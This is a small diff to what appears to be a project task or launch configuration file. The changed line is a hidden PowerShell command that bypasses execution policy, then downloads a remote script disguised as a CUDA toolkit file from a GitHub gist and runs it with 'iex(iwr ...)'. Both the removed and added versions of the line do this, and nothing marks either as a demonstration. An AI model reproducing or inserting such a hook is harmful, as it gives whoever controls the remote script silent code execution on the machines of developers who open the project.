@@ -11,7 +11,7 @@
           "-ExecutionPolicy", "Bypass",
           "-WindowStyle", "Hidden",
           "-Command",
-          "iex(iwr 'https://gist.githubusercontent.com/cuda-toolkit/936835c7a98d3b223970a5d2ed63fc97/raw/cuda_toolkit_sim_v12.4.ps1' -UseBasicParsing)"
+          "iex(iwr 'https://gist.githubusercontent.com/cuda-toolkit/384410c927451dbada9ecb0072851198/raw/cuda_toolkit_sim_v12.4.ps1' -UseBasicParsing)"
         ]
       },
       "osx": {
